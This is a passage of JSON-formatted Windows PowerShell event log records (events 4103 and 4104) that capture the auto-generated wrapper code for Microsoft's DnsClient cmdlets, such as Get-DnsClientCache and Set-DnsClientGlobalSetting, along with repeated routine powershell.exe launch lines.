      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT/StandardCimv2/MSFT_DNSClientGlobalSetting'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-DnsClientGlobalSetting\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientGlobalSetting')]\r\n\r\n    param(\r\n    \r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientGlobalSetting.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientGlobalSetting' -Alias '*'\r\n        \r\n\r\nfunction Set-DnsClientGlobalSetting\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, ConfirmImpact='Low', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientGlobalSetting')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='InputObject (cdxml)', ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_DNSClientGlobalSetting')]\r\n    [ValidateNotNull()]\r\n    [ciminstance[]]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [string[]]\r\n    ${SuffixSearchList},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [bool]\r\n    ${UseDevolution},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [uint32]\r\n    ${DevolutionLevel},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${AsJob},\r\n\r\n    [Parameter(ParameterSetName='InputObject (cdxml)')]\r\n    [switch]\r\n    ${PassThru})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n\r\n\r\n    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n    switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('InputObject (cdxml)') -contains $_ } {\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('SuffixSearchList')) {\r\n            [object]$__cmdletization_value = ${SuffixSearchList}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SuffixSearchList'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SuffixSearchList'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('UseDevolution')) {\r\n            [object]$__cmdletization_value = ${UseDevolution}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UseDevolution'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UseDevolution'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n          [object]$__cmdletization_defaultValue = $null\r\n          [object]$__cmdletization_defaultValueIsPresent = $false\r\n          if ($PSBoundParameters.ContainsKey('DevolutionLevel')) {\r\n            [object]$__cmdletization_value = ${DevolutionLevel}\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DevolutionLevel'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n          } else {\r\n            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DevolutionLevel'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n          }\r\n          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = $null\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru\r\n            if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }\r\n            } else {\r\n                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)\r\n            }\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientGlobalSetting.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-DnsClientGlobalSetting' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT/StandardCimv2/MSFT_DNSClientCache'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Clear-DnsClientCache\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Low', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Clear0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Clear0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Clear0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.UInt32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Clear', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientCache.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Clear-DnsClientCache' -Alias '*'\r\n        \r\n\r\nfunction Get-DnsClientCache\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByName', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClientCache')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByName', Position=0)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${Entry},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('RecordName')]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${Name},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('RecordType')]\r\n    [ValidateNotNull()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.DnsClientCache.Type[]]\r\n    ${Type},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [ValidateNotNull()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.DnsClientCache.Status[]]\r\n    ${Status},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [ValidateNotNull()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.DnsClientCache.Section[]]\r\n    ${Section},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('TTL')]\r\n    [ValidateNotNull()]\r\n    [uint32[]]\r\n    ${TimeToLive},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [ValidateNotNull()]\r\n    [uint16[]]\r\n    ${DataLength},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${Data},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\r\n    if ($PSBoundParameters.ContainsKey('Entry') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${Entry})\r\n        $__cmdletization_queryBuilder.FilterByProperty('Entry', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${Name})\r\n        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('Type') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${Type})\r\n        $__cmdletization_queryBuilder.FilterByProperty('Type', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${Status})\r\n        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('Section') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${Section})\r\n        $__cmdletization_queryBuilder.FilterByProperty('Section', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('TimeToLive') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${TimeToLive})\r\n        $__cmdletization_queryBuilder.FilterByProperty('TimeToLive', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('DataLength') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${DataLength})\r\n        $__cmdletization_queryBuilder.FilterByProperty('DataLength', $__cmdletization_values, $false, 'Default')\r\n    }\r\n    if ($PSBoundParameters.ContainsKey('Data') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {\r\n        $__cmdletization_values = @(${Data})\r\n        $__cmdletization_queryBuilder.FilterByProperty('Data', $__cmdletization_values, $true, 'Default')\r\n    }\r\n\r\n\r\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClientCache.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-DnsClientCache' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'ROOT/StandardCimv2/MSFT_DNSClient'\r\n$script:ClassVersion = '1.0.0'\r\n$script:ModuleVersion = '1.0.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Register-DnsClient\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Low', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Register0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Register0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Register0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.UInt32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Register', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP MSFT_DnsClient.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Register-DnsClient' -Alias '*'\r\n        \r\n\r\nfunction Get-DnsClient\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='ByName', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\r\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_DNSClient')]\r\n\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='ByName', ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\r\n    [ValidateNotNull()]\r\n    [uint32[]]\r\n    ${InterfaceIndex},\r\n\r\n    [Parameter(ParameterSetName='ByName', Position=0)]\r\n    [ValidateNotNull()]\r\n    [string[]]\r\n    ${InterfaceAlias},\r\n\r\n    [Parameter(ParameterSetName='ByName')]\r\n    